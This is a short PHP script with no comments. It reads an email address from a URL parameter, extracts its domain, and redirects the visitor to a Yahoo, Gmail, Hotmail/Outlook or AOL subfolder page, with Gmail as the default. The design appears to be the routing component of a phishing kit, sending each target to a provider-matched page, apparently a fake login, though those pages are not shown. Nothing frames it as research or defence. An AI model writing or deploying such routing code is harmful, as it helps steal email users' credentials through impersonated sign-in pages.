<?php
$ambil = $_GET['id'];
$email2 = $ambil."kliverz";
preg_match('/@(.*?)kliverz/',$email2,$domain);
$target = $domain[1];

if ($target == 'yahoo.com' || $target == 'gmail.com' || $target == 'hotmail.com' || $target == 'outlook.com' || $target == 'aol.com' || $target == 'else'){
if ($target == 'yahoo.com')
{
header("Location: yahoo/index.html");
}
if ($target == 'gmail.com')
{
header("Location: gmail/index.html");
}
if ($target == 'hotmail.com' || $target == 'outlook.com')
{
header("Location: hotmail/index.html");
}
if ($target == 'aol.com')
{
header("Location: AOL/index.html");
}
}
else 
{
header("Location: gmail/index.html");
}
?>